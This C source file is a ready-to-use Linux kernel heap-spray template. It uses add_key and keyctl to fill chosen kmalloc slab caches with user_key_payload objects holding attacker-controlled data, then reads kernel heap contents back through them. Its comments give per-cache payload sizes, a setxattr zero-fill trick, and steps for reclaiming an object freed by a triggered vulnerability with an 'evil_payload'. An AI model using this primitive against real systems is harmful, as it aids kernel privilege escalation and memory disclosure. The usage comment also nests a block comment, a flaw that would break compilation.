/*
 * user_key_payload Heap Spray Template
 *
 * struct user_key_payload layout:
 *   0x00: struct rcu_head rcu     (16 bytes - RCU callback)
 *   0x10: unsigned short datalen  (2 bytes - payload length)
 *   0x12: char data[]             (variable - user-controlled content)
 *
 * Total allocation: 18 + datalen, rounded up to slab size
 *
 * Targeting specific slab caches:
 *   kmalloc-64:   datalen = 1..46
 *   kmalloc-96:   datalen = 47..78
 *   kmalloc-128:  datalen = 79..110
 *   kmalloc-192:  datalen = 111..174
 *   kmalloc-256:  datalen = 175..238
 *   kmalloc-512:  datalen = 239..494
 *   kmalloc-1024: datalen = 495..1006
 *
 * Advantages:
 *   - Full read-back via keyctl_read()
 *   - Precise size control
 *   - Reliable allocation
 *   - Allocated in kmalloc-* (not kmalloc-cg-*)
 *
 * Limitations:
 *   - datalen is a u16, max 65535
 *   - Free is async (RCU), not immediate
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <linux/keyctl.h>
#include <sys/syscall.h>

#define KEY_SPRAY_COUNT   0x100
#define KEY_DATA_SIZE     238       /* Target kmalloc-256: 18 + 238 = 256 */

static int key_ids[KEY_SPRAY_COUNT];

/* Wrapper syscalls */
static inline int _add_key(const char *type, const char *desc,
                           const void *payload, size_t plen, int keyring) {
    return syscall(__NR_add_key, type, desc, payload, plen, keyring);
}

static inline long _keyctl_read(int key_id, void *buf, size_t buflen) {
    return syscall(__NR_keyctl, KEYCTL_READ, key_id, buf, buflen);
}

static inline long _keyctl_revoke(int key_id) {
    return syscall(__NR_keyctl, KEYCTL_REVOKE, key_id);
}

static inline long _keyctl_unlink(int key_id, int keyring) {
    return syscall(__NR_keyctl, KEYCTL_UNLINK, key_id, keyring);
}

/* Spray user_key_payload objects with controlled data */
int spray_keys(void *payload, size_t payload_size, int count) {
    char desc[32];
    char data[KEY_DATA_SIZE];

    if (payload && payload_size <= KEY_DATA_SIZE) {
        memset(data, 0, KEY_DATA_SIZE);
        memcpy(data, payload, payload_size);
    } else {
        memset(data, 'K', KEY_DATA_SIZE);
    }

    for (int i = 0; i < count && i < KEY_SPRAY_COUNT; i++) {
        snprintf(desc, sizeof(desc), "spray_%d", i);
        key_ids[i] = _add_key("user", desc, data, KEY_DATA_SIZE,
                               KEY_SPEC_PROCESS_KEYRING);
        if (key_ids[i] < 0) {
            perror("add_key");
            return -1;
        }
    }
    return 0;
}

/* Read back key payload (leak kernel heap content) */
int spray_key_read(int idx, void *buf, size_t size) {
    return _keyctl_read(key_ids[idx], buf, size);
}

/* Free a specific key (async via RCU) */
void spray_key_free(int idx) {
    _keyctl_revoke(key_ids[idx]);
    _keyctl_unlink(key_ids[idx], KEY_SPEC_PROCESS_KEYRING);
}

/* Free all sprayed keys */
void spray_keys_cleanup(int count) {
    for (int i = 0; i < count && i < KEY_SPRAY_COUNT; i++) {
        spray_key_free(i);
    }
}

/*
 * Advanced: setxattr-based zero-fill
 *
 * Use setxattr to briefly allocate a zeroed buffer in the target cache,
 * which can help initialize uninitialized fields:
 *
 *   char zeros[TARGET_SIZE];
 *   memset(zeros, 0, sizeof(zeros));
 *   setxattr("/tmp/x", "user.x", zeros, sizeof(zeros), XATTR_CREATE);
 *
 * The allocation is ephemeral - it's freed when setxattr returns (or fails).
 * Use this to pre-fill a slab slot with zeros before doing the real spray.
 */

/*
 * Usage pattern:
 *
 * 1. spray_keys(payload, sizeof(payload), KEY_SPRAY_COUNT);
 * 2. // ... trigger vulnerability to free target object ...
 * 3. spray_keys(evil_payload, sizeof(evil_payload), 1);  // Reclaim
 * 4. // ... for each key, read back and check for corruption ...
 * 5. char buf[KEY_DATA_SIZE];
 *    for (int i = 0; i < KEY_SPRAY_COUNT; i++) {
 *        spray_key_read(i, buf, KEY_DATA_SIZE);
 *        if (contains_leak(buf)) { /* found corrupted key */ }
 *    }
 * 6. spray_keys_cleanup(KEY_SPRAY_COUNT);
 */
